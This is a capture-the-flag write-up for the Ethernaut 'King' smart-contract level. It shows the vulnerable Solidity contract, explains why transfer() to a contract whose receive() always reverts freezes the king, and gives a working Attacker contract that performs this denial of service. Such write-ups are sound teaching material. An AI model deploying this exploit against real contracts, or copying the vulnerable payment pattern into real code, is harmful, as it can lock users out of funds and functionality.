# Ethernaut King solution
## Problem
The goal of this level is for you to prevent the owner claim the king a gain.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

## Explaination
+ So in the condition to be a king, we can see : case 1 we send the greate value, case 2 is sender is owner.
+ If the sender is owner, 100% require will be pass.
+ So we dont need to care about the require, 2 assign code in the end, only care about the transfer.
+ Because that the only thing can revert is in transfer().
### How to make transfer() revert?
+ In this case we only native coin, so in the receiver have 2 case:
1. Normal wallet(without code) : can't be revert!
2. Wallet with code : so the receive() is executed. So just make receive revert, it lead to the whole process will revert to!

## Solution 
So when we break all the information we need, the solution is really clearly :
1. Write a contract can claim king and can't receive native coin.
2. Claim the king, and that done :D

Here is the code:
```solidity
contract Attacker {

  function attack(address payable _victim) public payable{

    require(msg.value >= King(_victim).prize(), "Not enough money bro!");

    (bool success,) = _victim.call{value : msg.value}("");

    require(success, "Fail in call value to king victim");

  }
  receive() external payable {
    require(false, "Nah, I'm still king bro");
  }
}
```
